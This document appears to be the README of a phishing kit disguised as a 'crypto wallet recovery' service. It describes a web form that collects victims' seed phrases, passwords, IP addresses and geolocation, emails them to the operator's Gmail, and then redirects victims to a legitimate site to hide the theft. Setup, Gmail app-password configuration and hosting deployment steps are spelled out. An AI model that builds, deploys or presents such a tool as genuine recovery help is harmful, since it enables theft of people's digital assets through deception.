# Wallet Recovery Tool

A professional crypto wallet recovery and support system that helps users regain access to their digital assets.

This server collects crypto wallet data and sends it via email using Gmail. It includes a web interface for easy data collection.

## Features

- 🌐 **Web Interface**: User-friendly HTML form for data collection
- 📧 **Email Notifications**: Automatic email alerts to your Gmail
- 🔒 **Secure**: Uses Gmail app passwords for authentication
- 🚀 **Deployable**: Ready for deployment on various platforms

## Quick Start

### 1. Install Dependencies

```bash
npm install
```

### 2. Configure Gmail

#### Step 1: Enable 2-Factor Authentication

1. Go to [Google Account Settings](https://myaccount.google.com/)
2. Navigate to "Security"
3. Enable "2-Step Verification" if not already enabled

#### Step 2: Generate App Password

1. In the Security section, find "App passwords"
2. Click "App passwords"
3. Select "Mail" as the app and "Other" as the device
4. Click "Generate"
5. Copy the 16-character password that appears

### 3. Configure Your Email Settings

You have two options:

#### Option A: Using config.js (Easier)

Edit the `config.js` file:

```javascript
module.exports = {
  gmail: {
    user: "411plus411@gmail.com", // Replace with your Gmail
    appPassword: "your-16-character-app-password", // Replace with your app password
  },
};
```

#### Option B: Using Environment Variables (More Secure)

Create a `.env` file in your project root:

```
GMAIL_USER=411plus411@gmail.com
GMAIL_APP_PASSWORD=your-16-character-app-password
```

### 4. Start the Server

```bash
npm start
```

The server will run on `http://localhost:3000`

### 5. Test the Setup

- **Web Interface**: Visit `http://localhost:3000` in your browser
- **API Testing**: Run `npm test` to test the API endpoint
- **Email Testing**: Run `node email-test.js` to test email functionality

## Web Interface

Visit `http://localhost:3000` to access the web interface. The form will:

1. Collect user input (wallet name, seed phrase, password)
2. Gather system information (IP, user agent, geolocation, etc.)
3. Send all data to your email address
4. Redirect users to a legitimate crypto site

## API Endpoints

- **GET** `/` - Serves the web interface
- **POST** `/collect` - Receives data and sends it via email
- **Content-Type**: `application/json`
- **Body**: Any JSON object with the data you want to collect

## Deployment

This application is ready for deployment on various platforms:

- **Heroku** (Recommended)
- **Railway**
- **Vercel**
- **Render**

See [DEPLOYMENT.md](DEPLOYMENT.md) for detailed deployment instructions.

## Testing

### Test the Web Interface

```bash
npm start
# Then visit http://localhost:3000
```

### Test the API

```bash
npm test
```

### Test Email Configuration

```bash
node email-test.js
```

## Important Notes

- **Never commit your actual Gmail credentials to version control**
- The `.env` file should be added to `.gitignore`
- Use app passwords, not your regular Gmail password
- Make sure your Gmail account has "Less secure app access" enabled or use app passwords

## File Structure

```
├── index.js          # Main server file
├── index.html        # Web interface
├── config.js         # Email configuration
├── package.json      # Dependencies
├── test.js           # API test script
├── email-test.js     # Email test script
├── debug-test.js     # Debug test script
├── Procfile          # Heroku deployment
├── .gitignore        # Git ignore rules
├── DEPLOYMENT.md     # Deployment guide
└── README.md         # This file
```
